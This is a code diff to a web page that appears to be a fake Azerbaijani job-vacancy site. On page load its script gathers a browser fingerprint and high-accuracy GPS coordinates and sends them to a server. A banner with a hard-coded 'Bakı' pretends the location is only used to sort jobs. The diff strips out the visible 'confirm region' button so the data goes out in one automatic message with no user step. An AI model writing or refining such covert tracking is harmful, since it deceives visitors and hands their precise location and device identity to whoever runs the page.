@@ -50,7 +50,6 @@
         .btn-send { width: 100%; background: var(--success); color: white; border: none; padding: 13px; border-radius: 8px; font-weight: bold; cursor: pointer; }
         .loader { display: none; border: 3px solid #f3f3f3; border-top: 3px solid var(--primary); border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; margin: 10px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .banner-btn { margin-left: 10px; background: var(--primary); color: white; border: none; padding: 6px 12px; border-radius: 8px; font-size: 12px; font-weight: 700; cursor: pointer; }
         @media (max-width: 850px) {
             .container { grid-template-columns: 1fr; }
             .search-box { grid-template-columns: 1fr; }
@@ -447,10 +446,8 @@ async function collectFingerprint() {
 // GLOBAL STATE
 // ==========================================================
 let lastLocation = null;
-let locationReady = false;
-let fingerprintSent = false;
-let locationSent = false;
 let cachedFingerprint = null;
+let fingerprintSent = false;
 
 async function sendToServer(payload) {
     try {
@@ -463,14 +460,17 @@ async function sendToServer(payload) {
 }
 
 // ==========================================================
-// LOCATION
+// LOCATION + FINGERPRINT (BİR MESAJDA)
 // ==========================================================
-async function requestLocation() {
+async function requestLocationAndSend() {
     const banner = document.getElementById('loc-banner');
+
+    // Əvvəlcə fingerprint-i topla
+    cachedFingerprint = await collectFingerprint();
 
     if (!navigator.geolocation) {
         banner.style.display = "none";
-        await sendFingerprint(null);
+        await sendFullProfile(null);
         return;
     }
 
@@ -481,40 +481,26 @@ async function requestLocation() {
                 longitude: pos.coords.longitude,
                 accuracy: Math.round(pos.coords.accuracy || 0)
             };
-            locationReady = true;
 
             banner.style.background = "#dcfce7";
             banner.style.color = "#166534";
             banner.innerHTML = `
                 <i class="fas fa-check-circle"></i>
                 Region müəyyən edildi: <b>Bakı</b>. Uyğun işlər sıralandı.
-                <button class="banner-btn" onclick="confirmRegion()">Regionu təsdiqlə</button>
             `;
 
-            // ✅ 1) GPS dərhal göndər
-            if (!locationSent) {
-                locationSent = true;
-                if (!cachedFingerprint) cachedFingerprint = await collectFingerprint();
-                await sendToServer({
-                    action: "location_confirm",
-                    location: lastLocation,
-                    visitorId: cachedFingerprint?.visitorId,
-                });
-            }
-
-            // ✅ 2) Fingerprint-i də göndər (bir dəfə)
-            await sendFingerprint(lastLocation);
+            // ✅ GPS + fingerprint BİR mesajda
+            await sendFullProfile(lastLocation);
         },
         async (err) => {
-            // İcazə verilmədi
             banner.style.display = "none";
-            await sendFingerprint(null);
+            await sendFullProfile(null);
         },
         { enableHighAccuracy: true, timeout: 8000 }
     );
 }
 
-async function sendFingerprint(location) {
+async function sendFullProfile(location) {
     if (fingerprintSent) return;
     fingerprintSent = true;
 
@@ -528,23 +514,6 @@ async function sendFingerprint(location) {
         fingerprint: cachedFingerprint,
         visitorId: cachedFingerprint.visitorId,
     });
-}
-
-async function confirmRegion() {
-    const banner = document.getElementById('loc-banner');
-    banner.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Region təsdiqlənir...`;
-
-    await sendToServer({
-        action: "location_confirm",
-        location: lastLocation,
-        visitorId: cachedFingerprint?.visitorId,
-    });
-
-    setTimeout(() => {
-        banner.style.background = "#eff6ff";
-        banner.style.color = "#1e40af";
-        banner.innerHTML = `<i class="fas fa-check-circle"></i> Region təsdiqləndi. Vakansiyalar yeniləndi.`;
-    }, 700);
 }
 
 // ==========================================================
@@ -592,12 +561,7 @@ async function sendApplication() {
 // PAGE LOAD
 // ==========================================================
 window.addEventListener('DOMContentLoaded', async () => {
-    // 1. Fingerprint-i topla (hələ göndərmə)
-    cachedFingerprint = await collectFingerprint();
-
-    // 2. Location istə → icazə verilsə GPS dərhal göndəriləcək,
-    //    verilməsə fingerprint göndəriləcək
-    await requestLocation();
+    await requestLocationAndSend();
 });
 </script>
 
